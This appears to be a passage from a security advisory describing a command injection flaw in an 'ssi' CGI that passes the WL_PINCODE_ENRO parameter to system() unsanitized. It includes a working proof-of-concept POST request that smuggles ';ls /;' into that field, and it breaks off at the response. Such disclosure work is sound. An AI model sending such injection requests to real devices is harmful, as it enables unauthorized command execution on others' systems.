## Technical Details
To set the WPS pin code, the ssi CGI application calls system using
the WL_PINCODE_ENRO POST parameter as an argument. This parameter is
not sanitized, allowing for command injection. The output of the
injected command is provided in the response. Commands are executed as
the www-data user. The request below uses this vulnerability to
execute the command 'ls /':

```
POST /ssi/private/conf/aws_exec.html?page_url=index.htm&page_id=wless&page_sub=0&access=10dfba9807780980&language=1 HTTP/1.1

Content-Length: 67
Connection: Close

WPS_METHOD_EXEC=pin&WPS_MODE_EXEC=wired&WL_PINCODE_ENRO=123;ls /;
```

The response from the server includes the output of the command:

```
HTTP/1.1 200 OK
